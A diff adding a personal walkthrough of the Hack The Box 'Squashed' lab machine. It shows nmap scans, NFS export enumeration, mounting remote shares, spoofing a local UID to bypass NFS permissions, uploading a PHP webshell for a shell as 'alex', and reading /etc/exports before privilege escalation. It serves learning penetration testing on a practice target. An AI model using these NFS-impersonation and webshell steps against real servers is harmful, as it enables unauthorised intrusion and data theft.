@@ -61,4 +61,180 @@ Nmap done: 1 IP address (1 host up) scanned in 33.98 seconds
 They usually do a more speedy scan to know which ports are active and then use a global variable to store them and do a full scan on them.
 # ITERATION 3
 
-It s
+now let's start using some of the command that the official writeup uses to speed up things 
+
+the first line is:
+
+```{sh}
+ports=$(nmap -p- --min-rate=1000 -T4 squashed.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+```
+
+which after analysing it it returns a list of all the open ports, which are 22,80,111,2049,38857,41667,43647,48069 : this is stored in ports variable for the following command
+
+```{sh}
+nmap -p$ports -sC -sV 10.10.11.191
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-24 21:33 CET
+Nmap scan report for 10.10.11.191
+Host is up (0.063s latency).
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Built Better
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      38857/tcp   mountd
+|   100005  1,2,3      44013/udp6  mountd
+|   100005  1,2,3      49732/udp   mountd
+|   100005  1,2,3      53567/tcp6  mountd
+|   100021  1,3,4      33052/udp   nlockmgr
+|   100021  1,3,4      41667/tcp   nlockmgr
+|   100021  1,3,4      42896/udp6  nlockmgr
+|   100021  1,3,4      43861/tcp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+38857/tcp open  mountd   1-3 (RPC #100005)
+41667/tcp open  nlockmgr 1-4 (RPC #100021)
+43647/tcp open  mountd   1-3 (RPC #100005)
+48069/tcp open  mountd   1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.14 seconds
+
+```
+==
+Host is running a http server, and most interestingly a nfs server using rpcbind and nfs.
+
+If we get the exports file of nfs using:
+
+```{sh}
+showmount -e 10.10.11.191 
+
+Export list for 10.10.11.191:
+/home/ross    *
+/var/www/html *
+```
+
+we see that we can add files to the html server (if we can upload a file and then search for it we might just have a webshell ready)
+
+after some problems with the mount command we can do the following:
+
+```{sh}
+sudo mkdir /mnt/1
+sudo mount 10.10.11.191:/var/www/html /mnt/1
+ls -l /mnt/1
+
+ls: cannot access './1/index.html': Permission denied
+ls: cannot access './1/images': Permission denied
+ls: cannot access './1/css': Permission denied
+ls: cannot access './1/js': Permission denied
+total 0
+?????????? ? ? ? ?                 ? css
+?????????? ? ? ? ?                 ? images
+?????????? ? ? ? ?                 ? index.html
+?????????? ? ? ? ?                 ? js
+
+ls -ld /mnt/1
+
+drwxr-xr-- 5 2017 www-data 4096 de gen.  25 13:20 1
+```
+
+now we know that the directories are owned by 2017 and if we are www-data (the web server) we can read them
+
+```{sh}
+sudo mkdir /mnt/2
+sudo mount 10.10.11.191:/home/ross /mnt/2
+ls -ld ./2
+
+drwxr-xr-x 14 1001 1001 4096 de gen.  24 18:17 ./2
+
+ls -lR ./2/
+
+total 32
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Desktop
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Documents
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Downloads
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Music
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Pictures
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Public
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Templates
+drwxr-xr-x 2 1001 1001 4096 d’oct.   21 16:57 Videos
+
+./2/Desktop:
+total 0
+
+./2/Documents:
+total 4
+-rw-rw-r-- 1 1001 1001 1365 d’oct.   19 14:57 Passwords.kdbx
+
+./2/Downloads:
+total 0
+
+./2/Music:
+total 0
+
+./2/Pictures:
+total 0
+
+./2/Public:
+total 0
+
+./2/Templates:
+total 0
+
+./2/Videos:
+total 0
+
+```
+
+The next step i could not do, so let's look at the solution: The solution was to change user in the client machine as the server does not do any checks to verify that you are the user you claim to be (this
+was genuenly surprising to find out). That means that by changing to a user with same uid as 2017 we can look and modify the files in the server. Now, we will be able to ask the web server for a php file and execute a remote web shell :) 
+
+After inserting into the server the webshell.php file we only need to search for it. once done we open a listening server and kaboom!
+
+```{sh}
+$ whoami
+alex
+$ id   
+uid=2017(alex) gid=2017(alex) groups=2017(alex)
+```
+
+Now we have the user flag and we can move to escalate our privilages. 
+
+The following part i had not thought about but its possibly a nice thing to do after exploiting a service, which is to look up how is the service configured (if you found a vulnerability see how far you can
+take it).
+
+```{sh}
+$ cat /etc/exports	
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/var/www/html *(rw,sync,root_squash)
+/home/ross *(sync,root_squash)
+
+```
+
+We can see that if we try to impersonate root we will be squashed (it will be set to an anonymous account). (if no_root_shquash was enabled then we would just have to impersonate the root user and be done)
+
